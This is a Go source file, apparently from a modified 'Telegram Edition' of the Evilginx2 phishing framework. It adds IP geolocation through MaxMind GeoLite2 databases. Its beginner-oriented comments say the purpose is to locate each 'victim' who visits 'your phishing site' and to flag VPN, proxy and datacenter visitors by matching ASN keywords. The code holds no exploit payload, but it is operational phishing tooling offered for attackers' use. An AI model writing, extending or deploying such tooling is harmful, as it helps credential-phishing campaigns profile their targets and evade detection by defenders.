// core/geoip.go
// IP Geolocation Engine for Evilginx2
//
// Telegram Edition by @officialmonsterz (https://t.me/officialmonsterz)
//
// WHAT THIS DOES (baby steps):
//   When a victim visits your phishing site, this looks up their IP address
//   in a free MaxMind GeoLite2 database. It tells you what country and city
//   they are in, and whether they are using a VPN, proxy, or datacenter.
//
// DOWNLOAD REQUIREMENTS:
//   1. Go to https://dev.maxmind.com/geoip/geolite2-free-geolocation-data
//   2. Create a free MaxMind account (takes 2 minutes)
//   3. Download: GeoLite2-City.mmdb
//   4. Place it in: ~/.evilginx/GeoIP/GeoLite2-City.mmdb
//      OR pass -geoip-db /path/to/directory/ at runtime

package core

import (
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
	"github.com/oschwald/maxminddb-golang"
)

// GeoIPRecord holds geolocation data for a single IP address lookup.
// Every field has a JSON tag so it serializes correctly to the dashboard.
type GeoIPRecord struct {
	CountryISOCode string  `json:"country_code"`
	CountryName    string  `json:"country_name"`
	CityName       string  `json:"city_name"`
	Latitude       float64 `json:"latitude"`
	Longitude      float64 `json:"longitude"`
	TimeZone       string  `json:"time_zone"`
	IsVPN          bool    `json:"is_vpn"`
	IsProxy        bool    `json:"is_proxy"`
	IsDatacenter   bool    `json:"is_datacenter"`
	ISP            string  `json:"isp"`
	ASN            uint    `json:"asn"`
}

// GeoIPDatabase wraps the MaxMind reader with thread-safe lazy loading.
type GeoIPDatabase struct {
	path     string
	reader   *maxminddb.Reader
	mu       sync.RWMutex
	lastLoad time.Time
}

// geoIPCity is a minimal struct that decodes only the fields we need from the
// MaxMind City database. This keeps the memory footprint small.
type geoIPCity struct {
	Country struct {
		ISOCode string            `maxminddb:"iso_code"`
		Names   map[string]string `maxminddb:"names"`
	} `maxminddb:"country"`
	City struct {
		Names map[string]string `maxminddb:"names"`
	} `maxminddb:"city"`
	Location struct {
		Latitude  float64 `maxminddb:"latitude"`
		Longitude float64 `maxminddb:"longitude"`
		TimeZone  string  `maxminddb:"time_zone"`
	} `maxminddb:"location"`
}

// geoIPASN is a minimal struct that decodes ASN information for VPN/proxy
// and datacenter detection.
type geoIPASN struct {
	AutonomousSystemNumber       uint   `maxminddb:"autonomous_system_number"`
	AutonomousSystemOrganization string `maxminddb:"autonomous_system_organization"`
}

// NewGeoIPDatabase creates a GeoIP lookup engine.
//
// RULES (plain English):
//   - If path is empty, it searches: current dir, ~/.evilginx/GeoIP/, /usr/share/GeoIP/
//   - If no database is found, it logs a warning and returns nil
//   - Calling Lookup() on a nil *GeoIPDatabase is SAFE — it returns an empty record
//   - This means your server will NOT crash if the database file is missing
func NewGeoIPDatabase(path string) *GeoIPDatabase {
	if path == "" {
		candidates := []string{
			"GeoLite2-City.mmdb",
			filepath.Join("/usr", "share", "GeoIP", "GeoLite2-City.mmdb"),
			filepath.Join("/var", "lib", "GeoIP", "GeoLite2-City.mmdb"),
		}
		for _, c := range candidates {
			if _, err := os.Stat(c); err == nil {
				path = c
				break
			}
		}
	}

	if path == "" {
		homeDir, _ := os.UserHomeDir()
		if homeDir != "" {
			cfgPath := filepath.Join(homeDir, ".evilginx", "GeoIP", "GeoLite2-City.mmdb")
			if _, err := os.Stat(cfgPath); err == nil {
				path = cfgPath
			}
		}
	}

	if path == "" {
		log.Warning("geoip: GeoLite2-City.mmdb not found. Download from https://dev.maxmind.com/geoip/geolite2-free-geolocation-data")
		log.Warning("geoip: place the file in ~/.evilginx/GeoIP/ or pass -geoip-db <directory>")
		return nil
	}

	g := &GeoIPDatabase{path: path}
	if err := g.reload(); err != nil {
		log.Warning("geoip: failed to load database at %s: %v", path, err)
		return nil
	}
	log.Info("geoip: loaded GeoIP database from %s", path)
	return g
}

// reload opens the .mmdb file and replaces the reader. It is safe to call
// multiple times (for hot-reloading an updated database).
func (g *GeoIPDatabase) reload() error {
	r, err := maxminddb.Open(g.path)
	if err != nil {
		return fmt.Errorf("cannot open %s: %v", g.path, err)
	}

	g.mu.Lock()
	defer g.mu.Unlock()

	if g.reader != nil {
		g.reader.Close()
	}

	g.reader = r
	g.lastLoad = time.Now()
	return nil
}

// Lookup performs a geolocation lookup for the given IP address string.
//
// PLAIN ENGLISH:
//   - Pass it an IP like "192.168.1.1" or "203.0.113.5"
//   - It returns a GeoIPRecord with country, city, VPN status, ISP
//   - If the database is not loaded or the IP cannot be resolved,
//     it returns an empty record (zero values, empty strings)
//   - Safe to call on nil receiver — no crash
func (g *GeoIPDatabase) Lookup(ipStr string) GeoIPRecord {
	var record GeoIPRecord

	if g == nil {
		return record
	}

	host, _, err := net.SplitHostPort(ipStr)
	if err != nil {
		host = ipStr
	}

	ip := net.ParseIP(host)
	if ip == nil {
		return record
	}

	g.mu.RLock()
	reader := g.reader
	g.mu.RUnlock()

	if reader == nil {
		return record
	}

	// --- City/Country Lookup ---
	var city geoIPCity
	err = reader.Lookup(ip, &city)
	if err == nil {
		record.CountryISOCode = city.Country.ISOCode
		if name, ok := city.Country.Names["en"]; ok {
			record.CountryName = name
		} else {
			record.CountryName = city.Country.ISOCode
		}
		if name, ok := city.City.Names["en"]; ok {
			record.CityName = name
		}
		record.Latitude = city.Location.Latitude
		record.Longitude = city.Location.Longitude
		record.TimeZone = city.Location.TimeZone
	}

	// --- ASN Lookup for VPN/Proxy/Datacenter Detection ---
	// The GeoLite2-ASN.mmdb file must be in the same directory as the City file
	asnPath := filepath.Join(filepath.Dir(g.path), "GeoLite2-ASN.mmdb")
	if _, err := os.Stat(asnPath); err == nil {
		asnReader, err := maxminddb.Open(asnPath)
		if err == nil {
			var asn geoIPASN
			err = asnReader.Lookup(ip, &asn)
			if err == nil {
				record.ASN = asn.AutonomousSystemNumber
				record.ISP = asn.AutonomousSystemOrganization

				asnUpper := strings.ToUpper(asn.AutonomousSystemOrganization)

				// Datacenter detection — known cloud/hosting providers
				dcKeywords := []string{
					"DIGITALOCEAN", "AMAZON", "AWS", "AZURE", "MICROSOFT",
					"GOOGLE", "GCLOUD", "OVH", "HETZNER", "LINODE",
					"VULTR", "IONOS", "ORACLE", "CLOUDFLARE", "FASTLY",
					"AKAMAI", "ALIBABA", "SCALEWAY", "UPCLOUD", "HOSTINGER",
				}
				for _, kw := range dcKeywords {
					if strings.Contains(asnUpper, kw) {
						record.IsDatacenter = true
						break
					}
				}

				// VPN detection — known VPN providers
				vpnKeywords := []string{
					"NORDVPN", "EXPRESSVPN", "CYBERGHOST",
					"PRIVATE INTERNET ACCESS", "PROTONVPN",
					"WINDSCRIBE", "MULLVAD", "SURFSHARK",
					"HIDE.ME", "PROXYSEC",
				}
				for _, kw := range vpnKeywords {
					if strings.Contains(asnUpper, kw) {
						record.IsVPN = true
						break
					}
				}
			}
			asnReader.Close()
		}
	}

	// If in a datacenter but not a known VPN, flag as proxy
	if record.IsDatacenter && !record.IsVPN {
		record.IsProxy = true
	}

	return record
}

// ReloadDatabase forces a re-read of the .mmdb file.
// Call this after downloading an updated database file without restarting.
func (g *GeoIPDatabase) ReloadDatabase() error {
	if g == nil {
		return fmt.Errorf("geoip: database is nil")
	}
	return g.reload()
}

// Close releases the underlying MaxMind reader.
func (g *GeoIPDatabase) Close() {
	if g == nil {
		return
	}
	g.mu.Lock()
	defer g.mu.Unlock()
	if g.reader != nil {
		g.reader.Close()
		g.reader = nil
	}
}
